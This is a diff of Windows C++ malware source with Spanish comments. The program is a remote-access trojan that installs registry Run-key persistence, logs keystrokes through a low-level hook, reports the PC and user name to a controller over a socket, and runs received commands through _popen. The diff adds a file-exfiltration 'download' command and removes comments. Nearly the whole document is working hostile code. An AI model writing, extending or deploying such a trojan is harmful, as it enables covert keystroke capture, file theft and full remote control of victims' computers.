@@ -5,14 +5,15 @@
 #include <memory>
 #include <windows.h>
 #include <thread>
+#include <fstream>  
+#include <vector>   
 
 #pragma comment(lib, "ws2_32.lib")
-#pragma comment(lib, "advapi32.lib") // Librería necesaria para GetUserName
+#pragma comment(lib, "advapi32.lib")
 
-// --- VARIABLE GLOBAL PARA EL KEYLOGGER ---
 std::string registroTeclas = "";
 
-// --- 1. FUNCIÓN DE RECONOCIMIENTO (NUEVA) ---
+// --- 1. FUNCIÓN DE RECONOCIMIENTO ---
 std::string obtenerInfoSistema() {
     char pcName[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD pcSize = sizeof(pcName);
@@ -22,16 +23,39 @@ std::string obtenerInfoSistema() {
     DWORD userSize = sizeof(userName);
     GetUserNameA(userName, &userSize);
 
-    // Formato: NOMBRE-PC|USUARIO
     return std::string(pcName) + "|" + std::string(userName);
 }
 
-// --- 2. FUNCIONES DEL KEYLOGGER ---
+// --- 2. FUNCIÓN PARA ENVIAR ARCHIVOS ---
+void enviarArchivo(SOCKET sock, std::string ruta) {
+    std::ifstream file(ruta, std::ios::binary | std::ios::ate);
+    
+    if (!file.is_open()) {
+        std::string err = "ERROR: No se pudo abrir el archivo.\n";
+        send(sock, err.c_str(), (int)err.length(), 0);
+        return;
+    }
+
+    std::streamsize size = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    std::string header = "FILE_SIZE:" + std::to_string(size);
+    send(sock, header.c_str(), (int)header.length(), 0);
+
+    Sleep(300);
+
+    std::vector<char> buffer(size);
+    if (file.read(buffer.data(), size)) {
+        send(sock, buffer.data(), (int)size, 0);
+    }
+    file.close();
+}
+
+// --- 3. FUNCIONES DEL KEYLOGGER ---
 LRESULT CALLBACK HookTeclado(int nCode, WPARAM wParam, LPARAM lParam) {
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
         KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
         DWORD vkCode = pKeyBoard->vkCode;
-
         if (vkCode == VK_BACK) registroTeclas += "[BACKSPACE]";
         else if (vkCode == VK_RETURN) registroTeclas += "\n";
         else if (vkCode == VK_SPACE) registroTeclas += " ";
@@ -50,7 +74,7 @@ void IniciarKeylogger() {
     UnhookWindowsHookEx(hhkLowLevelKybd);
 }
 
-// --- 3. FUNCIÓN DE PERSISTENCIA ---
+// --- 4. PERSISTENCIA Y RCE ---
 void instalarPersistencia() {
     char rutaPropia[MAX_PATH];
     GetModuleFileNameA(NULL, rutaPropia, MAX_PATH);
@@ -63,12 +87,11 @@ void instalarPersistencia() {
     RegCloseKey(hKey);
 }
 
-// --- 4. FUNCIÓN PARA EJECUTAR COMANDOS (RCE) ---
 std::string ejecutarComando(const char* cmd) {
     std::array<char, 128> buffer;
     std::string resultado;
     std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
-    if (!pipe) return "Error al ejecutar el comando.\n";
+    if (!pipe) return "Error al ejecutar.\n";
     while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
         resultado += buffer.data();
     }
@@ -77,14 +100,11 @@ std::string ejecutarComando(const char* cmd) {
 
 // --- 5. MAIN ---
 int main() {
-    // A. Asegurar persistencia
     instalarPersistencia();
 
-    // B. Iniciar Keylogger
     std::thread hiloKeylogger(IniciarKeylogger);
     hiloKeylogger.detach(); 
 
-    // C. Configuración de Red
     WSADATA wsaData;
     SOCKET sock;
     struct sockaddr_in serv_addr;
@@ -101,11 +121,9 @@ int main() {
         return -1;
     }
 
-    // --- ENVIAR IDENTIDAD AL CONECTAR (CAMBIO AQUÍ) ---
     std::string identidad = obtenerInfoSistema();
     send(sock, identidad.c_str(), (int)identidad.length(), 0);
 
-    // D. Bucle de Control
     while (true) {
         memset(buffer, 0, 4096);
         int valread = recv(sock, buffer, 4096, 0);
@@ -114,21 +132,24 @@ int main() {
         std::string comando(buffer);
 
         if (comando == "dump") {
-            if (registroTeclas.empty()) {
-                send(sock, "Buffer vacio.\n", 14, 0);
-            } else {
+            if (registroTeclas.empty()) send(sock, "Buffer vacio.\n", 14, 0);
+            else {
                 send(sock, registroTeclas.c_str(), (int)registroTeclas.length(), 0);
                 registroTeclas = ""; 
             }
         } 
+        else if (comando.find("download ") == 0) {
+            std::string ruta = comando.substr(9);
+            enviarArchivo(sock, ruta);
+        }
         else {
             std::string respuesta = ejecutarComando(comando.c_str());
             if(respuesta.empty()) respuesta = "Comando ejecutado.\n";
             send(sock, respuesta.c_str(), (int)respuesta.length(), 0);
         }
-    }
+    } // Cierre del while
 
     closesocket(sock);
     WSACleanup();
     return 0;
-}
+} // Cierre del main
